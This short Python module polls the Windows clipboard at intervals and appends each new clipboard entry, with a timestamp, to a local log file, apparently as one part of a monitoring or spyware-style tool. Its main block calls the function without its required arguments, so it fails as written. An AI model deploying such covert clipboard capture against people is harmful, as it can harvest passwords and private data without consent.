#module to capture clipboard data
import win32clipboard
import time

# get the clipboard contents
def copy_clipboard(path,x,s):
    data_check=""
    while x>0:
        with open(path, "a") as f:
            f.write(time.asctime(time.localtime(time.time()))+" :\n")
            try:
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                if(pasted_data!=data_check):
                    data_check = pasted_data
                    f.write("\nClipboard Data: \n\n" + pasted_data)
                    f.write("\n"+"="*10+"  \t --><-- \t  "+"="*10+"\n\n\n")

            except:
                f.write("Clipboard could be not be copied \n")
                f.write("\n"+"="*10+"  \t --><-- \t  "+"="*10+"\n\n\n")
        x-=1
        time.sleep(s)

if __name__ == "__main__":
    copy_clipboard()
